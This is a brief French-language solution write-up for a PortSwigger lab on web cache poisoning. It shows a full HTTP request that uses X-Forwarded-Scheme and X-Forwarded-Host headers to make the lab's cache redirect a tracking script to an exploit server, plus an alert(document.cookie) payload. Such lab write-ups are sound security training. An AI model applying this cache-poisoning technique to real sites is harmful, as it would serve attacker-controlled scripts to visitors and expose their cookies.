# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

`Hint: Le lab accepte les deux headers X-Forwarded-Host et X-Forwarded-Scheme`

## Payload

Sur la home page il y a un script qui est chargé : `/resources/js/tracking.js`

Cette page est cachée donc j'essaye avec les deux headers fournis dans le hint.

```
GET /resources/js/tracking.js?m HTTP/2
Host: 0a1000b204a12d8e871b6cc200fb009a.web-security-academy.net
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a1000b204a12d8e871b6cc200fb009a.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a8400b404ca2dd1877b6bd601f200ed.exploit-server.net

HTTP/2 302 Found
Location: https://exploit-0a8400b404ca2dd1877b6bd601f200ed.exploit-server.net/resources/js/tracking.js?m
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

Et sur l'exploit serveur, créer la ressource `/resources/js/tracking.js` avec le contenu :

```js
alert(document.cookie);
```